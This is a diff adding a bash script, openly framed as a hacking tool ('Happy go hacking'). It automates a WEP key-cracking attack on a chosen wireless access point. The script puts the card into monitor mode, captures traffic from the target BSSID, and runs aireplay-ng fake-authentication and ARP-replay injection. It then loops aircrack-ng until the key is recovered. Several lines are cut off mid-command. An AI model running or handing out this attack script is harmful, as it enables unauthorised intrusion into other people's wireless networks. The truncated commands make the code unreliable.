@@ -1,0 +1,69 @@
+!/bin/bash
+clear
+
+sleep 1
+
+        ownmac=`ifconfig wlan0 | grep wlan0 | tr -s " " | cut -d " " -f5 | cut $
+        echo "Happy go hacking"
+sleep 2
+
+        airmon-ng start wlan0
+        airodump-ng mon0 &
+
+sleep 5 
+
+        killall airodump-ng
+
+sleep 3
+        echo "Enter ESSID Name of AP to target"
+        read essid
+
+	echo "Enter BSSID MAC to target"
+        read bssid
+
+        echo "Enter Channel"
+        read channel
+
+        gnome-terminal -e "airodump-ng -w ./crackcap/capture --bssid $bssid --c$
+
+sleep 3
+ 
+        aireplay-ng -1 0 -e $essid -a $bssid -h $ownmac mon0 &
+
+sleep 2
+
+        gnome-terminal -e "aireplay-ng -3 -b $bssid -h $ownmac mon0" &
+
+sleep 15
+
+while true
+
+do
+
+        aircrack-ng -s ./crackcap/capture-01.cap
+
+        echo -n "MESSAGE: Did you get the key?: (y or n)"
+
+        read -e CONFIRM
+
+        case $CONFIRM in
+
+                y|Y|Yes|YES|yes)
+
+                        break  ;;
+
+                        *) echo "MESSAGE: Will attemp to crack again" & sleep 3
+
+        esac
+
+done
+
+       rm ./crackcap/*
+
+        rm ./*.cap
+
+        airmon-ng stop mon0
+
+exit
+
+
